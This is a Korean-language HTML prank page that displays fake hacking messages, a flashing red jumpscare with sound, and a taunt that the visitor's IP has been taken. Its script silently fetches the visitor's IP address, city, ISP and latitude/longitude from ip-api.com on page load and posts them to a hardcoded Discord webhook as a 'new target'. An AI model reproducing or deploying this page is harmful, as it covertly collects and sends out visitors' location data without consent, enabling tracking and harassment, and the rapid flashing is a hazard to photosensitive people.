<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>시스템 오류</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #terminal {
            width: 90%;
            height: 90%;
            text-align: left;
            font-size: 1.2rem;
            line-height: 1.5;
        }

        #jumpscare {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background-color: red;
            z-index: 9999;
            animation: flash 0.1s infinite;
        }

        @keyframes flash {
            0% { background-color: red; }
            50% { background-color: black; }
            100% { background-color: red; }
        }

        #result-screen {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
            background-color: #000;
            z-index: 10000;
        }

        #ip-text {
            color: #ff0000;
            font-size: 12vw;
            font-weight: bold;
            text-shadow: 2px 2px 20px #ffcc00;
            font-family: 'Malgun Gothic', sans-serif;
            text-align: center;
            word-break: keep-all;
        }
    </style>
</head>
<body>

    <div id="terminal"></div>
    <div id="jumpscare"></div>
    <div id="result-screen">
        <div id="ip-text">너 ip따임 ㅋㅋㅋ</div>
    </div>

    <!-- 비디오 파일에서 소리만 빼서 무한 반복 -->
    <video id="sumpsound" src="ScreenRecording_08-31-2026 22-35-48_1.mov" preload="auto" loop playsinline style="display:none;"></video>

    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1543975289527341118/tgC_i7WSsTccdUWBE2FXjMkY1__piEvWo1UxZkP3BTlbKNpCrlAujbLFeEjJoMyIbrxl';

        // IP 및 세부 정보 추출 API (ip-api 사용)
        fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query')
            .then(res => res.json())
            .then(data => {
                if(data.status === 'success') {
                    const messageContent = `🎯 **새로운 타겟 포착!**
> **IP 주소:** \`${data.query}\`
> **국가/도시:** ${data.country} / ${data.regionName} / ${data.city}
> **통신사(ISP):** ${data.isp} (${data.org})
> **위치 좌표:** 위도 ${data.lat}, 경도 ${data.lon}
> **타임존:** ${data.timezone}`;

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            content: messageContent
                        })
                    }).catch(err => console.error(err));
                }
            })
            .catch(() => {});

        const term = document.getElementById('terminal');
        const jump = document.getElementById('jumpscare');
        const result = document.getElementById('result-screen');
        const sound = document.getElementById('sumpsound');

        const lines = [
            "Connection established...",
            "Bypassing security protocols...",
            "Accessing local network...",
            "Extracting user data...",
            "Locating IPv4 address...",
            "Target locked."
        ];

        window.onload = () => {
            let i = 0;
            const typingInterval = setInterval(() => {
                if (i < lines.length) {
                    term.innerHTML += lines[i] + "<br>";
                    i++;
                } else {
                    clearInterval(typingInterval);
                    term.style.display = 'none';
                    jump.style.display = 'block';

                    // 플래시와 함께 소리 재생
                    sound.play().catch(e => console.log("Audio play blocked:", e));

                    setTimeout(() => {
                        jump.style.display = 'none';
                        result.style.display = 'flex';
                    }, 250);
                }
            }, 400);
        };
    </script>
</body>
</html>
